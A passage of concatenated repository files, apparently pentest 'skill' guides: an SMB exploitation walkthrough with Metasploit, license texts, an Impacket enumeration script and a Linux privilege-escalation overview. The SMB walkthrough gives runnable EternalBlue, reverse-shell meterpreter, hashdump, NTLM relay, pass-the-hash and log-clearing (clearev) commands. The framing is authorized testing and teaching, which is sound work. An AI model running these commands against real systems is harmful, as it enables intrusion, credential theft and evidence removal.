@@ -1,0 +1,1210 @@
+[PART 10/14]
+-----
+- Validating that patch management processes have addressed known SMB vulnerabilities
+- Assessing SMB signing enforcement and share permission configurations across the domain
+- Testing network segmentation by attempting SMB exploitation across VLAN boundaries
+
+**Do not use** against systems without explicit written authorization, against production domain controllers without a maintenance window, or to deploy persistent backdoors beyond the scope of the assessment.
+
+## Prerequisites
+
+- Metasploit Framework 6.x installed (`msfconsole --version`)
+- Authorized penetration test scope document listing target IP ranges and approved attack types
+- Network access to target SMB services (TCP 445, TCP 139)
+- CrackMapExec and Impacket tools installed for complementary SMB testing
+- Valid test credentials or credential wordlists approved for the engagement
+- Kali Linux or equivalent testing platform
+
+## Workflow
+
+### Step 1: Enumerate SMB Services and Versions
+
+```bash
+# Discover hosts with SMB open using Nmap
+nmap -sS -p 445,139 --open -oA smb_hosts 10.10.0.0/24
+
+# Enumerate SMB versions and OS information
+nmap -sV -p 445 --script smb-os-discovery,smb-protocols -oA smb_enum 10.10.0.0/24
+
+# Use CrackMapExec for rapid SMB enumeration
+crackmapexec smb 10.10.0.0/24 --gen-relay-list smb_nosigning.txt
+
+# Check SMB signing status (disabled = vulnerable to relay)
+crackmapexec smb 10.10.0.0/24 --smb-signing
+
+# Enumerate shares with null session
+crackmapexec smb 10.10.0.0/24 -u '' -p '' --shares
+```
+
+### Step 2: Scan for Known SMB Vulnerabilities
+
+```bash
+# Start Metasploit and scan for MS17-010 (EternalBlue)
+msfconsole -q
+msf6> use auxiliary/scanner/smb/smb_ms17_010
+msf6 auxiliary(smb_ms17_010)> set RHOSTS file:smb_hosts.txt
+msf6 auxiliary(smb_ms17_010)> set THREADS 10
+msf6 auxiliary(smb_ms17_010)> run
+
+# Scan for MS08-067 (Conficker vulnerability)
+msf6> use auxiliary/scanner/smb/ms08_067_check
+msf6 auxiliary(ms08_067_check)> set RHOSTS file:smb_hosts.txt
+msf6 auxiliary(ms08_067_check)> run
+
+# Check for SMBGhost (CVE-2020-0796)
+nmap -p 445 --script smb-vuln-cve-2020-0796 10.10.0.0/24
+
+# Check for PrintNightmare (CVE-2021-34527)
+crackmapexec smb 10.10.0.0/24 -u testuser -p 'TestPass123' -M printnightmare
+```
+
+### Step 3: Exploit EternalBlue (MS17-010)
+
+```bash
+msf6> use exploit/windows/smb/ms17_010_eternalblue
+msf6 exploit(ms17_010_eternalblue)> set RHOSTS 10.10.5.23
+msf6 exploit(ms17_010_eternalblue)> set LHOST 10.10.1.99
+msf6 exploit(ms17_010_eternalblue)> set LPORT 4444
+msf6 exploit(ms17_010_eternalblue)> set PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf6 exploit(ms17_010_eternalblue)> set MaxExploitAttempts 3
+msf6 exploit(ms17_010_eternalblue)> exploit
+
+# Post-exploitation -- verify access level
+meterpreter> getuid
+# Server username: NT AUTHORITY\SYSTEM
+
+meterpreter> sysinfo
+meterpreter> ipconfig
+meterpreter> hashdump
+```
+
+### Step 4: Perform SMB Relay Attack
+
+```bash
+# Identify hosts without SMB signing (from Step 1)
+# Set up NTLM relay with Impacket
+sudo impacket-ntlmrelayx -tf smb_nosigning.txt -smb2support -i
+
+# Trigger authentication from a compromised host or via phishing
+# From Meterpreter session on a compromised host:
+meterpreter> shell
+C:\> net use \\10.10.1.99\share /user:DOMAIN\admin password
+
+# Or use Metasploit's SMB relay module
+msf6> use exploit/windows/smb/smb_relay
+msf6 exploit(smb_relay)> set SMBHOST 10.10.5.30
+msf6 exploit(smb_relay)> set LHOST 10.10.1.99
+msf6 exploit(smb_relay)> exploit
+
+# Use responder to capture NTLM hashes for offline cracking
+sudo responder -I eth0 -wrfv
+```
+
+### Step 5: Pass-the-Hash and Lateral Movement via SMB
+
+```bash
+# Extract hashes from compromised system
+meterpreter> hashdump
+# Administrator:500:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
+
+# Use pass-the-hash with CrackMapExec
+crackmapexec smb 10.10.0.0/24 -u Administrator \
+  -H e19ccf75ee54e06b06a5907af13cef42 --shares
+
+# Execute commands via pass-the-hash
+crackmapexec smb 10.10.5.30 -u Administrator \
+  -H e19ccf75ee54e06b06a5907af13cef42 -x "whoami && hostname"
+
+# Use Impacket psexec for interactive shell
+impacket-psexec Administrator@10.10.5.30 \
+  -hashes aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42
+
+# Use Metasploit psexec module
+msf6> use exploit/windows/smb/psexec
+msf6 exploit(psexec)> set RHOSTS 10.10.5.30
+msf6 exploit(psexec)> set SMBUser Administrator
+msf6 exploit(psexec)> set SMBPass aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42
+msf6 exploit(psexec)> set PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf6 exploit(psexec)> set LHOST 10.10.1.99
+msf6 exploit(psexec)> exploit
+```
+
+### Step 6: Document Findings and Clean Up
+
+```bash
+# Document all compromised systems and access levels
+# In Meterpreter, screenshot desktops for evidence
+meterpreter> screenshot
+
+# List accessible shares and sensitive data
+meterpreter> shell
+C:\> net share
+C:\> dir \\10.10.5.30\C$\Users\ /s /b
+
+# Clean up -- remove any artifacts
+meterpreter> clearev
+meterpreter> shell
+C:\> del /f C:\Windows\Temp\payload.exe
+
+# Close all sessions
+msf6> sessions -K
+
+# Verify cleanup
+crackmapexec smb 10.10.5.23 -u Administrator -H <hash> -x "dir C:\Windows\Temp\payload*"
+```
+
+## Key Concepts
+
+| Term | Definition |
+|------|------------|
+| **EternalBlue (MS17-010)** | Critical SMB vulnerability in SMBv1 allowing remote code execution as SYSTEM without authentication, originally developed by the NSA and leaked by Shadow Brokers |
+| **SMB Signing** | Cryptographic signing of SMB packets to prevent tampering and relay attacks; when disabled, attackers can relay NTLM authentication to other SMB hosts |
+| **Pass-the-Hash** | Authentication technique using captured NTLM password hashes directly instead of plaintext passwords, bypassing the need to crack the hash |
+| **NTLM Relay** | Attack where captured NTLM authentication is forwarded to a different server in real-time, granting the attacker access as the relayed user |
+| **PsExec** | Remote execution technique that uploads a service binary to the ADMIN$ share and creates a Windows service to execute commands as SYSTEM |
+| **Null Session** | Anonymous SMB connection (empty username and password) that may expose share listings, user enumeration, and policy information on misconfigured systems |
+
+## Tools & Systems
+
+- **Metasploit Framework**: Exploitation framework with dedicated SMB scanner, exploit, and post-exploitation modules for comprehensive SMB testing
+- **CrackMapExec**: Swiss-army knife for SMB enumeration, credential testing, share enumeration, and command execution across Windows networks
+- **Impacket**: Python library providing psexec, smbclient, ntlmrelayx, and other tools for low-level SMB protocol interaction
+- **Responder**: LLMNR/NBT-NS/mDNS poisoner that captures NTLM hashes from Windows name resolution fallback behavior
+- **enum4linux-ng**: Updated SMB enumeration tool for extracting users, groups, shares, and policies from Windows/Samba hosts
+
+## Common Scenarios
+
+### Scenario: Internal Penetration Test Targeting Windows Domain via SMB
+
+**Context**: During an internal penetration test for a financial services firm, the tester has network access to the corporate VLAN (10.10.0.0/16). The scope includes testing all Windows servers and workstations for SMB-related vulnerabilities. Active Directory domain is CORP.EXAMPLE.COM with approximately 200 hosts.
+
+**Approach**:
+1. Scan the entire /16 for open SMB ports and enumerate OS versions with CrackMapExec
+2. Identify 12 hosts running Windows Server 2012 R2 without MS17-010 patch applied
+3. Exploit EternalBlue on a non-critical file server (10.10.5.23) to gain SYSTEM access
+4. Extract local administrator password hash using hashdump and discover password reuse across 47 hosts
+5. Use pass-the-hash to access a domain controller, extracting the NTDS.dit database
+6. Demonstrate that SMB signing is disabled on 83% of hosts, enabling relay attacks
+7. Document the complete attack chain showing how one unpatched system led to full domain compromise
+
+**Pitfalls**:
+- EternalBlue exploit can cause a blue screen of death (BSOD) on the target, especially on older or unstable systems
+- Running psexec on heavily monitored endpoints may trigger EDR alerts and burn the engagement
+- Performing hashdump on domain controllers with large databases can cause performance degradation
+- Not checking for SMBv1 explicitly -- some scanners may miss it if SMBv2/v3 is also available
+
+## Output Format
+
+```
+## SMB Vulnerability Assessment Report
+
+**Engagement**: Internal Penetration Test
+**Target Range**: 10.10.0.0/16 (CORP.EXAMPLE.COM)
+**SMB Hosts Discovered**: 187
+
+### Critical Findings
+
+**Finding 1: MS17-010 (EternalBlue) - 12 Unpatched Hosts**
+- Severity: Critical (CVSS 9.8)
+- Affected: 10.10.5.23, 10.10.5.24, 10.10.8.10 (+ 9 others)
+- Impact: Remote code execution as SYSTEM without authentication
+- Exploited: Yes - gained SYSTEM on 10.10.5.23
+- Remediation: Apply MS17-010 patch, disable SMBv1
+
+**Finding 2: SMB Signing Disabled - 155/187 Hosts**
+- Severity: High (CVSS 7.5)
+- Impact: NTLM relay attacks allow credential forwarding
+- Exploited: Yes - relayed domain admin credentials
+- Remediation: Enable SMB signing via Group Policy
+
+**Finding 3: Local Admin Password Reuse - 47 Hosts**
+- Severity: High (CVSS 7.2)
+- Impact: Compromise of one host enables lateral movement to 47 systems
+- Remediation: Deploy LAPS (Local Administrator Password Solution)
+```
+
+##### END FILE #####
+
+##### FILE: exploiting-smb-vulnerabilities-with-metasploit/LICENSE #####
+
+                                 Apache License
+                           Version 2.0, January 2004
+                        http://www.apache.org/licenses/
+
+   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION
+
+   1. Definitions.
+
+      "License" shall mean the terms and conditions for use, reproduction,
+      and distribution as defined by Sections 1 through 9 of this document.
+
+      "Licensor" shall mean the copyright owner or entity authorized by
+      the copyright owner that is granting the License.
+
+      "Legal Entity" shall mean the union of the acting entity and all
+      other entities that control, are controlled by, or are under common
+      control with that entity. For the purposes of this definition,
+      "control" means (i) the power, direct or indirect, to cause the
+      direction or management of such entity, whether by contract or
+      otherwise, or (ii) ownership of fifty percent (50%) or more of the
+      outstanding shares, or (iii) beneficial ownership of such entity.
+
+      "You" (or "Your") shall mean an individual or Legal Entity
+      exercising permissions granted by this License.
+
+      "Source" form shall mean the preferred form for making modifications,
+      including but not limited to software source code, documentation
+      source, and configuration files.
+
+      "Object" form shall mean any form resulting from mechanical
+      transformation or translation of a Source form, including but
+      not limited to compiled object code, generated documentation,
+      and conversions to other media types.
+
+      "Work" shall mean the work of authorship, whether in Source or
+      Object form, made available under the License, as indicated by a
+      copyright notice that is included in or attached to the work
+      (an example is provided in the Appendix below).
+
+      "Derivative Works" shall mean any work, whether in Source or Object
+      form, that is based on (or derived from) the Work and for which the
+      editorial revisions, annotations, elaborations, or other modifications
+      represent, as a whole, an original work of authorship. For the purposes
+      of this License, Derivative Works shall not include works that remain
+      separable from, or merely link (or bind by name) to the interfaces of,
+      the Work and Derivative Works thereof.
+
+      "Contribution" shall mean any work of authorship, including
+      the original version of the Work and any modifications or additions
+      to that Work or Derivative Works thereof, that is intentionally
+      submitted to the Licensor for inclusion in the Work by the copyright owner
+      or by an individual or Legal Entity authorized to submit on behalf of
+      the copyright owner. For the purposes of this definition, "submitted"
+      means any form of electronic, verbal, or written communication sent
+      to the Licensor or its representatives, including but not limited to
+      communication on electronic mailing lists, source code control systems,
+      and issue tracking systems that are managed by, or on behalf of, the
+      Licensor for the purpose of discussing and improving the Work, but
+      excluding communication that is conspicuously marked or otherwise
+      designated in writing by the copyright owner as "Not a Contribution."
+
+      "Contributor" shall mean Licensor and any individual or Legal Entity
+      on behalf of whom a Contribution has been received by the Licensor and
+      subsequently incorporated within the Work.
+
+   2. Grant of Copyright License. Subject to the terms and conditions of
+      this License, each Contributor hereby grants to You a perpetual,
+      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
+      copyright license to reproduce, prepare Derivative Works of,
+      publicly display, publicly perform, sublicense, and distribute the
+      Work and such Derivative Works in Source or Object form.
+
+   3. Grant of Patent License. Subject to the terms and conditions of
+      this License, each Contributor hereby grants to You a perpetual,
+      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
+      (except as stated in this section) patent license to make, have made,
+      use, offer to sell, sell, import, and otherwise transfer the Work,
+      where such license applies only to those patent claims licensable
+      by such Contributor that are necessarily infringed by their
+      Contribution(s) alone or by combination of their Contribution(s)
+      with the Work to which such Contribution(s) was submitted. If You
+      institute patent litigation against any entity (including a
+      cross-claim or counterclaim in a lawsuit) alleging that the Work
+      or a Contribution incorporated within the Work constitutes direct
+      or contributory patent infringement, then any patent licenses
+      granted to You under this License for that Work shall terminate
+      as of the date such litigation is filed.
+
+   4. Redistribution. You may reproduce and distribute copies of the
+      Work or Derivative Works thereof in any medium, with or without
+      modifications, and in Source or Object form, provided that You
+      meet the following conditions:
+
+      (a) You must give any other recipients of the Work or
+          Derivative Works a copy of this License; and
+
+      (b) You must cause any modified files to carry prominent notices
+          stating that You changed the files; and
+
+      (c) You must retain, in the Source form of any Derivative Works
+          that You distribute, all copyright, patent, trademark, and
+          attribution notices from the Source form of the Work,
+          excluding those notices that do not pertain to any part of
+          the Derivative Works; and
+
+      (d) If the Work includes a "NOTICE" text file as part of its
+          distribution, then any Derivative Works that You distribute must
+          include a readable copy of the attribution notices contained
+          within such NOTICE file, excluding any notices that do not
+          pertain to any part of the Derivative Works, in at least one
+          of the following places: within a NOTICE text file distributed
+          as part of the Derivative Works; within the Source form or
+          documentation, if provided along with the Derivative Works; or,
+          within a display generated by the Derivative Works, if and
+          wherever such third-party notices normally appear. The contents
+          of the NOTICE file are for informational purposes only and
+          do not modify the License. You may add Your own attribution
+          notices within Derivative Works that You distribute, alongside
+          or as an addendum to the NOTICE text from the Work, provided
+          that such additional attribution notices cannot be construed
+          as modifying the License.
+
+      You may add Your own copyright statement to Your modifications and
+      may provide additional or different license terms and conditions
+      for use, reproduction, or distribution of Your modifications, or
+      for any such Derivative Works as a whole, provided Your use,
+      reproduction, and distribution of the Work otherwise complies with
+      the conditions stated in this License.
+
+   5. Submission of Contributions. Unless You explicitly state otherwise,
+      any Contribution intentionally submitted for inclusion in the Work
+      by You to the Licensor shall be under the terms and conditions of
+      this License, without any additional terms or conditions.
+      Notwithstanding the above, nothing herein shall supersede or modify
+      the terms of any separate license agreement you may have executed
+      with Licensor regarding such Contributions.
+
+   6. Trademarks. This License does not grant permission to use the trade
+      names, trademarks, service marks, or product names of the Licensor,
+      except as required for reasonable and customary use in describing the
+      origin of the Work and reproducing the content of the NOTICE file.
+
+   7. Disclaimer of Warranty. Unless required by applicable law or
+      agreed to in writing, Licensor provides the Work (and each
+      Contributor provides its Contributions) on an "AS IS" BASIS,
+      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
+      implied, including, without limitation, any warranties or conditions
+      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
+      PARTICULAR PURPOSE. You are solely responsible for determining the
+      appropriateness of using or redistributing the Work and assume any
+      risks associated with Your exercise of permissions under this License.
+
+   8. Limitation of Liability. In no event and under no legal theory,
+      whether in tort (including negligence), contract, or otherwise,
+      unless required by applicable law (such as deliberate and grossly
+      negligent acts) or agreed to in writing, shall any Contributor be
+      liable to You for damages, including any direct, indirect, special,
+      incidental, or consequential damages of any character arising as a
+      result of this License or out of the use or inability to use the
+      Work (including but not limited to damages for loss of goodwill,
+      work stoppage, computer failure or malfunction, or any and all
+      other commercial damages or losses), even if such Contributor
+      has been advised of the possibility of such damages.
+
+   9. Accepting Warranty or Additional Liability. While redistributing
+      the Work or Derivative Works thereof, You may choose to offer,
+      and charge a fee for, acceptance of support, warranty, indemnity,
+      or other liability obligations and/or rights consistent with this
+      License. However, in accepting such obligations, You may act only
+      on Your own behalf and on Your sole responsibility, not on behalf
+      of any other Contributor, and only if You agree to indemnify,
+      defend, and hold each Contributor harmless for any liability
+      incurred by, or claims asserted against, such Contributor by reason
+      of your accepting any such warranty or additional liability.
+
+   END OF TERMS AND CONDITIONS
+
+   APPENDIX: How to apply the Apache License to your work.
+
+      To apply the Apache License to your work, attach the following
+      boilerplate notice, with the fields enclosed by brackets "[]"
+      replaced with your own identifying information. (Don't include
+      the brackets!)  The text should be enclosed in the appropriate
+      comment syntax for the file format. Please do not remove or change
+      the license header comment from a contributed file except when
+      necessary.
+
+   Copyright 2026 mukul975
+
+   Licensed under the Apache License, Version 2.0 (the "License");
+   you may not use this file except in compliance with the License.
+   You may obtain a copy of the License at
+
+       http://www.apache.org/licenses/LICENSE-2.0
+
+   Unless required by applicable law or agreed to in writing, software
+   distributed under the License is distributed on an "AS IS" BASIS,
+   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+   See the License for the specific language governing permissions and
+   limitations under the License.
+
+##### END FILE #####
+
+##### FILE: exploiting-smb-vulnerabilities-with-metasploit/references/api-reference.md #####
+# API Reference: SMB Vulnerability Assessment Agent
+
+## Dependencies
+
+| Library | Version | Purpose |
+|---------|---------|---------|
+| impacket | >=0.11.0 | SMB connection, negotiation, share enumeration |
+
+## CLI Usage
+
+```bash
+python scripts/agent.py \
+  --targets 10.10.0.0/24 \
+  --username testuser --password 'P@ss' --domain CORP \
+  --output smb_report.json
+```
+
+## Functions
+
+### `check_smb_port(target, port, timeout) -> bool`
+TCP connect check on port 445.
+
+### `enumerate_smb(target, username, password, domain) -> dict`
+Connects via `SMBConnection`, checks signing status, enumerates OS info and shares. Tests null session if no credentials provided.
+
+### `scan_network(targets, username, password, domain) -> list`
+Iterates over targets calling `enumerate_smb` on each.
+
+### `find_relay_targets(results) -> list`
+Returns IPs where `isSigningRequired()` returns `False` (vulnerable to NTLM relay).
+
+### `check_null_sessions(results) -> list`
+Returns IPs accepting anonymous SMB connections.
+
+### `expand_cidr(cidr) -> list`
+Expands CIDR notation to individual host IPs using `ipaddress.ip_network`.
+
+### `generate_report(results) -> dict`
+Compiles findings: signing status, null sessions, accessible shares, risk summary.
+
+## Impacket SMBConnection Methods
+
+| Method | Purpose |
+|--------|---------|
+| `SMBConnection(host, host)` | Initialize SMB connection |
+| `negotiateSession()` | Negotiate SMB dialect |
+| `isSigningRequired()` | Check if message signing is enforced |
+| `login(user, pass, domain)` | Authenticate with credentials |
+| `listShares()` | Enumerate available SMB shares |
+| `getServerOS()` | Retrieve OS version string |
+
+## Output Schema
+
+```json
+{
+  "smb_hosts_found": 15,
+  "signing_disabled_hosts": ["10.10.0.5", "10.10.0.12"],
+  "null_session_hosts": ["10.10.0.5"],
+  "accessible_shares": [{"host": "10.10.0.5", "share": "Users"}],
+  "findings": ["HIGH: 2/15 hosts have SMB signing disabled"]
+}
+```
+
+##### END FILE #####
+
+##### FILE: exploiting-smb-vulnerabilities-with-metasploit/scripts/agent.py #####
+#!/usr/bin/env python3
+# For authorized testing in lab/CTF environments only
+"""SMB vulnerability assessment agent using Impacket for enumeration and signing checks."""
+
+import argparse
+import json
+import logging
+import sys
+from datetime import datetime
+from typing import List
+
+try:
+    from impacket.smbconnection import SMBConnection
+    from impacket import smbconnection
+except ImportError:
+    sys.exit("impacket is required: pip install impacket")
+
+logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
+logger = logging.getLogger(__name__)
+
+
+def check_smb_port(target: str, port: int = 445, timeout: int = 5) -> bool:
+    """Check if SMB port is open on the target."""
+    import socket
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(timeout)
+        s.connect((target, port))
+        s.close()
+        return True
+    except (socket.timeout, ConnectionRefusedError, OSError):
+        return False
+
+
+def enumerate_smb(target: str, username: str = "", password: str = "",
+                   domain: str = "") -> dict:
+    """Enumerate SMB service information on a target host."""
+    result = {
+        "target": target,
+        "port_open": check_smb_port(target),
+        "os_info": "",
+        "smb_version": "",
+        "signing_required": True,
+        "shares": [],
+        "error": None,
+    }
+    if not result["port_open"]:
+        result["error"] = "SMB port 445 not reachable"
+        return result
+
+    try:
+        smb = SMBConnection(target, target, sess_port=445, timeout=10)
+        smb.negotiateSession()
+        result["signing_required"] = smb.isSigningRequired()
+        result["smb_version"] = f"SMBv{smb.getDialect()}"
+
+        if username:
+            smb.login(username, password, domain)
+            result["os_info"] = smb.getServerOS()
+            shares = smb.listShares()
+            for share in shares:
+                share_name = share["shi1_netname"][:-1]
+                share_type = share["shi1_type"]
+                result["shares"].append({
+                    "name": share_name,
+                    "type": share_type,
+                    "remark": share["shi1_remark"][:-1] if share["shi1_remark"] else "",
+                })
+            smb.logoff()
+        else:
+            try:
+                smb.login("", "")
+                result["null_session"] = True
+                shares = smb.listShares()
+                for share in shares:
+                    result["shares"].append({"name": share["shi1_netname"][:-1]})
+                smb.logoff()
+            except Exception:
+                result["null_session"] = False
+
+        smb.close()
+    except Exception as exc:
+        result["error"] = str(exc)
+        logger.warning("SMB enum failed on %s: %s", target, exc)
+
+    return result
+
+
+def scan_network(targets: List[str], username: str = "", password: str = "",
+                  domain: str = "") -> List[dict]:
+    """Scan multiple targets for SMB services."""
+    results = []
+    for target in targets:
+        logger.info("Scanning %s...", target)
+        info = enumerate_smb(target, username, password, domain)
+        results.append(info)
+    return results
+
+
+def find_relay_targets(results: List[dict]) -> List[str]:
+    """Identify hosts where SMB signing is not required (relay targets)."""
+    targets = [r["target"] for r in results if not r.get("signing_required", True) and r["port_open"]]
+    logger.info("Found %d SMB relay targets (signing disabled)", len(targets))
+    return targets
+
+
+def check_null_sessions(results: List[dict]) -> List[str]:
+    """Identify hosts accepting null SMB sessions."""
+    return [r["target"] for r in results if r.get("null_session")]
+
+
+def generate_report(results: List[dict]) -> dict:
+    """Generate SMB vulnerability assessment report."""
+    smb_hosts = [r for r in results if r["port_open"]]
+    relay_targets = find_relay_targets(results)
+    null_hosts = check_null_sessions(results)
+
+    findings = []
+    if relay_targets:
+        findings.append(
+            f"HIGH: {len(relay_targets)}/{len(smb_hosts)} hosts have SMB signing disabled"
+        )
+    if null_hosts:
+        findings.append(
+            f"MEDIUM: {len(null_hosts)} hosts accept null SMB sessions"
+        )
+
+    all_shares = []
+    for r in smb_hosts:
+        for s in r.get("shares", []):
+            all_shares.append({"host": r["target"], "share": s["name"]})
+
+    return {
+        "assessment_date": datetime.utcnow().isoformat(),
+        "total_targets_scanned": len(results),
+        "smb_hosts_found": len(smb_hosts),
+        "signing_disabled_hosts": relay_targets,
+        "null_session_hosts": null_hosts,
+        "accessible_shares": all_shares,
+        "findings": findings,
+    }
+
+
+def expand_cidr(cidr: str) -> List[str]:
+    """Expand a CIDR range to individual IPs (supports /24 and smaller)."""
+    import ipaddress
+    try:
+        network = ipaddress.ip_network(cidr, strict=False)
+        return [str(ip) for ip in network.hosts()]
+    except ValueError:
+        return [cidr]
+
+
+def main():
+    parser = argparse.ArgumentParser(description="SMB Vulnerability Assessment Agent")
+    parser.add_argument("--targets", nargs="+", required=True, help="Target IPs or CIDR ranges")
+    parser.add_argument("--username", default="", help="Domain username")
+    parser.add_argument("--password", default="", help="Password")
+    parser.add_argument("--domain", default="", help="Domain name")
+    parser.add_argument("--output", default="smb_report.json")
+    args = parser.parse_args()
+
+    all_targets = []
+    for t in args.targets:
+        all_targets.extend(expand_cidr(t))
+
+    results = scan_network(all_targets, args.username, args.password, args.domain)
+    report = generate_report(results)
+
+    with open(args.output, "w") as f:
+        json.dump(report, f, indent=2)
+    logger.info("Report saved to %s", args.output)
+    print(json.dumps(report, indent=2))
+
+
+if __name__ == "__main__":
+    main()
+
+##### END FILE #####
+
+##### FILE: performing-privilege-escalation-on-linux/SKILL.md #####
+---
+name: performing-privilege-escalation-on-linux
+description: Guides manual enumeration and automated tooling to escalate from a low-privilege
+  Linux user to root by exploiting misconfigurations, vulnerable services, kernel exploits,
+  and weak permissions, mapped to MITRE ATT&CK. Use during authorized red team engagements
+  or penetration tests once initial low-privilege access on a Linux host is obtained
+  and root-level access is needed.
+domain: cybersecurity
+subdomain: red-teaming
+tags:
+- red-team
+- adversary-simulation
+- mitre-attack
+- exploitation
+- post-exploitation
+- privilege-escalation
+- linux
+version: '1.0'
+author: mahipal
+license: Apache-2.0
+d3fend_techniques:
+- Restore Object
+- Network Traffic Policy Mapping
+- Restore Configuration
+- Access Modeling
+- Operational Activity Mapping
+nist_csf:
+- ID.RA-01
+- GV.OV-02
+- DE.AE-07
+mitre_attack:
+- T1595
+- T1190
+- T1059
+- T1078
+- T1068
+---
+# Performing Privilege Escalation on Linux
+
+
+> **Legal Notice:** This skill is for authorized security testing and educational purposes only. Unauthorized use against systems you do not own or have written permission to test is illegal and may violate computer fraud laws.
+
+## Overview
+
+Linux privilege escalation involves elevating from a low-privilege user account to root access on a compromised system. Red teams exploit misconfigurations, vulnerable services, kernel exploits, and weak permissions to achieve root. This skill covers both manual enumeration techniques and automated tools for identifying and exploiting privilege escalation vectors.
+
+
+## When to Use
+
+- When conducting security assessments that involve performing privilege escalation on linux
+- When following incident response procedures for related security events
+- When performing scheduled security testing or auditing activities
+- When validating security controls through hands-on testing
+
+## Prerequisites
+
+- Familiarity with red teaming concepts and tools
+- Access to a test or lab environment for safe execution
+- Python 3.8+ with required dependencies installed
+- Appropriate authorization for any testing activities
+
+## MITRE ATT&CK Mapping
+
+- **T1548.001** - Abuse Elevation Control Mechanism: Setuid and Setgid
+- **T1548.003** - Abuse Elevation Control Mechanism: Sudo and Sudo Caching
+- **T1068** - Exploitation for Privilege Escalation
+- **T1574.006** - Hijack Execution Flow: Dynamic Linker Hijacking
+- **T1053.003** - Scheduled Task/Job: Cron
+- **T1543.002** - Create or Modify System Process: Systemd Service
+
+## Key Escalation Vectors
+
+### SUID/SGID Binaries
+- Find SUID binaries: `find / -perm -4000 -type f 2>/dev/null`
+- Check GTFOBins for exploitation methods
+- Custom SUID binaries may have vulnerabilities
+
+### Sudo Misconfigurations
+- `sudo -l` to list allowed commands
+- Wildcards in sudo rules allow injection
+- NOPASSWD entries for dangerous commands
+- sudo versions vulnerable to CVE-2021-3156 (Baron Samedit)
+
+### Kernel Exploits
+- Dirty Cow (CVE-2016-5195) for older kernels
+- Dirty Pipe (CVE-2022-0847) for kernel 5.8+
+- PwnKit (CVE-2021-4034) for pkexec
+- GameOver(lay) (CVE-2023-2640, CVE-2023-32629) for Ubuntu
+
+### Cron Job Abuse
+- World-writable cron scripts
+- PATH hijacking in cron jobs
+- Wildcard injection in cron commands
+
+### Capabilities
+- `getcap -r / 2>/dev/null` to find binaries with capabilities
+- cap_setuid allows UID manipulation
+- cap_dac_override bypasses file permissions
+
+### Writable Service Files
+- Systemd unit files with weak permissions
+- Init scripts writable by non-root users
+- Socket files in accessible locations
+
+## Tools and Resources
+
+| Tool | Purpose |
+|------|---------|
+| LinPEAS | Automated privilege escalation enumeration |
+| LinEnum | Linux enumeration script |
+| linux-exploit-suggester | Kernel exploit matching |
+| pspy | Process monitoring without root |
+| GTFOBins | SUID/sudo binary exploitation reference |
+| PEASS-ng | Privilege escalation awesome scripts suite |
+
+## Validation Criteria
+
+- [ ] Enumeration performed using automated tools
+- [ ] Privilege escalation vector identified
+- [ ] Root access achieved through identified vector
+- [ ] Evidence documented (screenshots, command output)
+- [ ] Alternative escalation paths identified
+
+##### END FILE #####
+
+##### FILE: performing-privilege-escalation-on-linux/LICENSE #####
+
+                                 Apache License
+                           Version 2.0, January 2004
+                        http://www.apache.org/licenses/
+
+   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION
+
+   1. Definitions.
+
+      "License" shall mean the terms and conditions for use, reproduction,
+      and distribution as defined by Sections 1 through 9 of this document.
+
+      "Licensor" shall mean the copyright owner or entity authorized by
+      the copyright owner that is granting the License.
+
+      "Legal Entity" shall mean the union of the acting entity and all
+      other entities that control, are controlled by, or are under common
+      control with that entity. For the purposes of this definition,
+      "control" means (i) the power, direct or indirect, to cause the
+      direction or management of such entity, whether by contract or
+      otherwise, or (ii) ownership of fifty percent (50%) or more of the
+      outstanding shares, or (iii) beneficial ownership of such entity.
+
+      "You" (or "Your") shall mean an individual or Legal Entity
+      exercising permissions granted by this License.
+
+      "Source" form shall mean the preferred form for making modifications,
+      including but not limited to software source code, documentation
+      source, and configuration files.
+
+      "Object" form shall mean any form resulting from mechanical
+      transformation or translation of a Source form, including but
+      not limited to compiled object code, generated documentation,
+      and conversions to other media types.
+
+      "Work" shall mean the work of authorship, whether in Source or
+      Object form, made available under the License, as indicated by a
+      copyright notice that is included in or attached to the work
+      (an example is provided in the Appendix below).
+
+      "Derivative Works" shall mean any work, whether in Source or Object
+      form, that is based on (or derived from) the Work and for which the
+      editorial revisions, annotations, elaborations, or other modifications
+      represent, as a whole, an original work of authorship. For the purposes
+      of this License, Derivative Works shall not include works that remain
+      separable from, or merely link (or bind by name) to the interfaces of,
+      the Work and Derivative Works thereof.
+
+      "Contribution" shall mean any work of authorship, including
+      the original version of the Work and any modifications or additions
+      to that Work or Derivative Works thereof, that is intentionally
+      submitted to the Licensor for inclusion in the Work by the copyright owner
+      or by an individual or Legal Entity authorized to submit on behalf of
+      the copyright owner. For the purposes of this definition, "submitted"
+      means any form of electronic, verbal, or written communication sent
+      to the Licensor or its representatives, including but not limited to
+      communication on electronic mailing lists, source code control systems,
+      and issue tracking systems that are managed by, or on behalf of, the
+      Licensor for the purpose of discussing and improving the Work, but
+      excluding communication that is conspicuously marked or otherwise
+      designated in writing by the copyright owner as "Not a Contribution."
+
+      "Contributor" shall mean Licensor and any individual or Legal Entity
+      on behalf of whom a Contribution has been received by the Licensor and
+      subsequently incorporated within the Work.
+
+   2. Grant of Copyright License. Subject to the terms and conditions of
+      this License, each Contributor hereby grants to You a perpetual,
+      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
+      copyright license to reproduce, prepare Derivative Works of,
+      publicly display, publicly perform, sublicense, and distribute the
+      Work and such Derivative Works in Source or Object form.
+
+   3. Grant of Patent License. Subject to the terms and conditions of
+      this License, each Contributor hereby grants to You a perpetual,
+      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
+      (except as stated in this section) patent license to make, have made,
